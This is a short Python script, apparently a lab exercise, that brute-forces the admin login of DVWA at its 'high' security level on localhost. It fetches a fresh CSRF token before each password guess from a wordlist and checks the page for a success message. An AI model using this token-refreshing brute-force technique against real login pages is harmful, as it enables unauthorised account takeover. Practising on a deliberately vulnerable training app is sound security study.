# Brute Forces High Level DVWA.
import requests
from lxml import etree
# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
url = 'http://127.0.0.1/DVWA/vulnerabilities/brute/'
cookie = {'security': 'high', 'PHPSESSID': 'ka9s5le3m8c2kqub6mr0n291ne'}
s = requests.Session()


# Lay csrf_token
def csrf_token():
    r = s.get(url, cookies=cookie)
    # print(r.content)
    if r.status_code == requests.codes.ok:
        content = etree.fromstring(r.content, etree.HTMLParser(recover=True))
        data = content.findall(".//input[@type='hidden']")
        csrf_token = data[0].attrib['value']
        return csrf_token
    else:
        print(r.status_code)
        print('Khong ket noi duoc den URL!')
        return 0
    r.close()

# Tan cong vet can voi tu dien va token duoc tao moi moi lan thu
def brute_force():
    with open('password.txt', 'r') as f:
        print('Running brtute forces attack...')
        for password in f:
            token = csrf_token()
            if not token:
                print('Khong lay duoc token')
            else:
                payload = {"username":"admin", "password": password, "Login": "Login", "user_token": token}
                r = s.get(url, cookies=cookie, params=payload)
                print('username: admin, password: ' + password)
                check = etree.fromstring(r.content, etree.HTMLParser(recover=True))
                success = check.xpath(".//p[text()='Welcome to the password protected area admin']")
                if not success:
                    print('Mat khau khong chinh xac')
                else:
                    print('Tai khoan admin co mat khau: ' + password)
                    break
    r.close()


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    brute_force()
